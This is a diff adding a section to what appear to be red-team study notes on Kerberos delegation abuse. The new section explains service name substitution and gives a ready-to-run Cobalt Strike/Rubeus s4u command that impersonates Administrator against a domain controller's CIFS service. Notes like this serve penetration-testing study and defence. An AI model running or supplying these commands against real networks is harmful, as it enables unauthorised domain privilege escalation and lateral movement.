@@ -83,3 +83,18 @@ three types: unconstrained, constrained, role-based
                             /ticket is the TGT for the principal
                             /tgs is a captured service ticket for a user
                 now we can interact with the service, as above
+
+service name substitution:
+    technique that allows an adversary to swap a service ticket from one service to another
+    since both the AS-REP and TGS-REP share the data structure KDC-REP, we can alter the SPN (sname[2] field) as it is not encrypted
+        NOTE: this only works if running as the same account as the original service
+    HOW TO ABUSE:
+        assuming protocol transition is enabled:
+        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:[ticket] /impersonateuser:Administrator /nowrap
+            where...
+                /user is the computer configured for delegation
+                /msdsspn is the service the principal is allowed to delegate to
+                /altservice is the service to substitute
+                /ticket is the TGT for the principal
+                /impersonateuser is the user we want to impersonate
+            
